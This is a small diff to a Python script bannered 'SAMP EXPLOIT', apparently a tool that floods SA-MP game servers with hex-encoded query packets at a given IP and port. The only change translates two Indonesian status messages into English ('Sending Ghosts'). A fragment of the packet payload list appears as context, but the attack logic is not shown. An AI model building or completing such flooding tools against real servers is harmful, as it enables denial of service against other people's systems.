@@ -25,7 +25,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-print("[+] Mengirim Barang kepada %s Port Tersebut %s"%(orgip,port))
+print("[+] Sending Ghosts into ip %s In Port %s"%(orgip,port))
 
             
 
@@ -68,5 +68,5 @@ if __name__ == '__main__':
          print('                SAMP EXPLOIT ')
          print('=========================================================================')
          print('\n\n')
-         print('[+] Mengirim Wibu Kepada kamu'.format(orgip))
+         print('[+] Sending Ghosts '.format(orgip))
          pass
